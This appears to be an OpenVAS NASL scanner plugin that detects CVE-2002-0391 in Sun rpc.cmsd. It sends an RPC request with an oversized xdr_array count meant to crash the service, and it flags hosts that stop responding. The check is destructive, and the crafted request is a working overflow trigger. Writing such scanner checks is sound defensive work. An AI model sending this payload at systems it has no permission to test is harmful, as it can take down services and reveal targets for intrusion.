if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11418" );
	script_version( "2021-04-14T09:28:27+0000" );
	script_tag( name: "last_modification", value: "2021-04-14 09:28:27 +0000 (Wed, 14 Apr 2021)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_bugtraq_id( 5356 );
	script_cve_id( "CVE-2002-0391" );
	script_name( "Sun rpc.cmsd Overflow" );
	script_category( ACT_DESTRUCTIVE_ATTACK );
	script_copyright( "Copyright (C) 2003 Xue Yong Zhi" );
	script_family( "General" );
	script_dependencies( "secpod_rpc_portmap_udp.sc", "secpod_rpc_portmap_tcp.sc" );
	script_mandatory_keys( "rpc/portmap" );
	script_tag( name: "solution", value: "We suggest that you disable this service and apply a new patch." );
	script_tag( name: "summary", value: "The remote Sun rpc.cmsd has integer overflow problem in xdr_array. An attacker
  may use this flaw to execute arbitrary code on this host with the privileges rpc.cmsd is running as (typically, root),
  by sending a specially crafted request to this service." );
	script_tag( name: "solution_type", value: "Mitigation" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("rpc.inc.sc");
require("nfs_func.inc.sc");
require("byte_func.inc.sc");
RPC_PROG = 100068;
tcp = 0;
port = rpc_get_port( program: RPC_PROG, protocol: IPPROTO_UDP );
if(!port){
	port = rpc_get_port( program: RPC_PROG, protocol: IPPROTO_TCP );
	tcp = 1;
}
if(port){
	if( tcp ){
		soc = open_sock_tcp( port );
	}
	else {
		soc = open_sock_udp( port );
	}
	pad = padsz( len: strlen( this_host_name() ) );
	len = 20 + strlen( this_host_name() ) + pad;
	req1 = rpclong( val: rand() ) + rpclong( val: 0 ) + rpclong( val: 2 ) + rpclong( val: 100070 ) + rpclong( val: 4 ) + rpclong( val: 21 );
	send( socket: soc, data: req1 );
	r = recv( socket: soc, length: 4096 );
	close( soc );
	if(!r){
		exit( 0 );
	}
	if( tcp ){
		proto = "tcp";
		soc = open_sock_tcp( port );
	}
	else {
		proto = "udp";
		soc = open_sock_udp( port );
	}
	req = rpclong( val: rand() ) + rpclong( val: 0 ) + rpclong( val: 2 ) + rpclong( val: 100068 ) + rpclong( val: 4 ) + rpclong( val: 21 ) + rpclong( val: 1 ) + rpclong( val: len ) + rpclong( val: rand() ) + rpclong( val: strlen( this_host_name() ) ) + this_host_name() + rpcpad( pad: pad ) + rpclong( val: 0 ) + rpclong( val: 0 ) + rpclong( val: 0 ) + rpclong( val: 0 ) + rpclong( val: 0 ) + rpclong( val: 1 ) + rpclong( val: 67 ) + rpclong( val: 1 ) + rpclong( val: 67 ) + rpclong( val: 0 ) + rpclong( val: 1073741825 ) + rpclong( val: 0 ) + rpclong( val: 0 ) + rpclong( val: 0 ) + rpclong( val: 0 ) + rpclong( val: 0 ) + rpclong( val: 0 ) + rpclong( val: 0 ) + rpclong( val: 0 ) + rpclong( val: 0 ) + rpclong( val: 0 ) + rpclong( val: 0 ) + rpclong( val: 0 ) + rpclong( val: 0 ) + rpclong( val: 0 ) + rpclong( val: 0 ) + rpclong( val: 0 );
	send( socket: soc, data: req );
	r = recv( socket: soc, length: 4096 );
	if(!r){
		security_message( port: port, proto: proto );
	}
}

